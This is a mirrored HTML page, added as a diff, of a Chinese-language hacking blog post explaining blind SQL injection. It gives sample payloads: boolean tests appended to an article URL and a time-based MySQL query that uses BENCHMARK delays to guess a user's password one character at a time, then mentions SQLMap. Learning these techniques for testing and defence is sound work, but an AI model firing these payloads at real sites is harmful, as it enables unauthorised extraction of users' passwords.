@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html>
+  
+<!-- Mirrored from topspeedsnail.com/hack-blind-sql-injection-attack/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 04:25:44 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <title>盲SQL注入攻击</title>
+
+        <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="盲SQL注入攻击(blind SQL injection attack)是SQL注入攻击的一种类型，这种攻击方式是问数据库”真假”问题，然后根据数据库的回应判断答案－应用程序输出的错误信息。
+
+" />
+    <meta property="og:description" content="盲SQL注入攻击(blind SQL injection attack)是SQL注入攻击的一种类型，这种攻击方式是问数据库”真假”问题，然后根据数据库的回应判断答案－应用程序输出的错误信息。
+
+" />
+    
+    <meta name="author" content="Elephant And Balloon" />
+
+    
+    <meta property="og:title" content="盲SQL注入攻击" />
+    <meta property="twitter:title" content="盲SQL注入攻击" />
+    
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="../style.css" />
+    <link rel="alternate" type="application/rss+xml" title="Elephant And Balloon - 关于黑技术的小博客" href="../feed.xml" />
+
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  </head>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        <header class="masthead clearfix">
+          <a href="../index.html" class="site-avatar"><img src="https://avatars1.githubusercontent.com/u/5637917?v=3&amp;s=140" /></a>
+
+          <div class="site-info">
+            <h1 class="site-name"><a href="../index.html">Elephant And Balloon</a></h1>
+            <p class="site-description">关于黑技术的小博客</p>
+          </div>
+
+          <nav>
+            <a href="../index.html">主页</a>
+            <a href="../about/index.html">关于我</a>
+          </nav>
+
+        </header>
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>盲SQL注入攻击</h1>
+
+  <div class="entry">
+    <p>盲SQL注入攻击(blind SQL injection attack)是<a href="../hack-sql-injection-attack/index.html">SQL注入攻击</a>的一种类型，这种攻击方式是问数据库”真假”问题，然后根据数据库的回应判断答案－应用程序输出的错误信息。</p>
+
+<p>盲SQL注入和SQL注入的不同是从数据库中获得数据的方式，当数据库不向网页上输出数据时，攻击者通过问数据库一系列的”真假”问题获得敏感数据。</p>
+
+<h3 id="基于内容">基于内容</h3>
+
+<p>假设有一个根据ID号显示文章的简单网页，攻击者可以执行几个简单的测试来判断这个页面是否可以执行SLQ注入攻击。</p>
+
+<p>示例网页：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://blogspot.com/article.php?id=10
+</code></pre>
+</div>
+
+<p>发送到数据库的查询：</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="n">title</span><span class="p">,</span> <span class="n">dateTime</span><span class="p">,</span> <span class="n">content</span> <span class="k">FROM</span> <span class="n">article</span> <span class="k">WHERE</span> <span class="n">ID</span><span class="o">=</span><span class="mi">10</span></code></pre></figure>
+
+<p>攻击者注入返回”假”的SQL查询：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://blogspot.com/article.php?id=10 and 1=2
+</code></pre>
+</div>
+
+<p>SQL查询语句变为：</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="n">title</span><span class="p">,</span> <span class="n">dateTime</span><span class="p">,</span> <span class="n">content</span> <span class="k">FROM</span> <span class="n">article</span> <span class="k">WHERE</span> <span class="n">ID</span><span class="o">=</span><span class="mi">10</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span></code></pre></figure>
+
+<p>如果web应用容易受到SQL注入攻击，那么它可能不会返回任何东西。为了确认，攻击者再次注入返回”真”的SQL查询：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://blogspot.com/article.php?id=10 and 1=1
+</code></pre>
+</div>
+
+<p>如果真假两次查询返回的数据内容不一样，攻击者就可以判断什么时候SQL语句返回ture/false。一旦把这一点确认之后，攻击者就可以根据不同SQL语句执行不同的任务。</p>
+
+<h3 id="基于时间">基于时间</h3>
+
+<p>这种攻击方式依赖数据库响应时间。根据返回结果的时间长短可以判断出SQL语句是否成功执行。</p>
+
+<p>以MySQL为例：</p>
+
+<p>条件判断语句：</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="n">IF</span><span class="p">(</span><span class="n">expression</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="k">false</span><span class="p">)</span></code></pre></figure>
+
+<p>如果expression表达式为真，执行一些延时操作，如，BENCHMARK()：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>BENCHMARK(5000000，ENCODE('MSG', 'by 5 sec'))
+</code></pre>
+</div>
+
+<p>执行ENCODE函数5000000次，影响了查询响应时间。</p>
+
+<p>组合起来：</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">IF</span><span class="p">(</span><span class="k">SUBSTRING</span><span class="p">(</span><span class="n">passwd</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'a'</span><span class="p">,</span> <span class="n">BENCHMARK</span><span class="p">(</span><span class="mi">5000000</span><span class="err">，</span><span class="n">ENCODE</span><span class="p">(</span><span class="s1">'MSG'</span><span class="p">,</span> <span class="s1">'by 5 sec'</span><span class="p">)),</span> <span class="k">null</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span></code></pre></figure>
+
+<p>如果数据库响应时间变长，也许id==1的的用户密码第一个字符为’a’:</p>
+
+<p>使用这种方法依次探测其余的密码字符。</p>
+
+<p>这个方法和上面的不同，它不影响数据库返回的数据。</p>
+
+<p>很显然，上面我们使用了已知的字段名，其实，这些字段名有可能猜出来，也可以慢慢尝试（查看错误信息）。</p>
+
+<p>手动执行上面的攻击是很费时的，幸运的是有很多现成的自动化工具，有一个工具叫<a href="sqlmap.html">SQLMap</a>:</p>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-14%2012-24-45.png" alt="sqlmap" /></p>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-14%2012-37-19.png" alt="sqlmap" /></p>
+
+<p><a href="../hacker-attack-method/index.html">黑客常用攻击方式汇总</a></p>
+
+  </div>
+
+  <div class="date">
+    Written on April 14, 2016
+  </div>
+
+  
+<div class="comments">
+	<div id="disqus_thread"></div>
+	<script type="text/javascript">
+
+	    var disqus_shortname = 'elephantandballoon';
+
+	    (function() {
+	        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+	        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	    })();
+
+	</script>
+	<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        <footer class="footer">
+          
+
+
+
+<a href="https://github.com/tiancode"><i class="svg-icon github"></i></a>
+
+
+
+
+
+
+
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+	<!-- Google Analytics -->
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','http://www.google-analytics.com/analytics.js','ga');
+
+		ga('create', 'UA-75657205-1', 'auto');
+		ga('send', 'pageview', {
+		  'page': '/hack-blind-sql-injection-attack/',
+		  'title': '盲SQL注入攻击'
+		});
+	</script>
+	<!-- End Google Analytics -->
+
+
+  </body>
+
+<!-- Mirrored from topspeedsnail.com/hack-blind-sql-injection-attack/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 04:25:58 GMT -->
+</html>
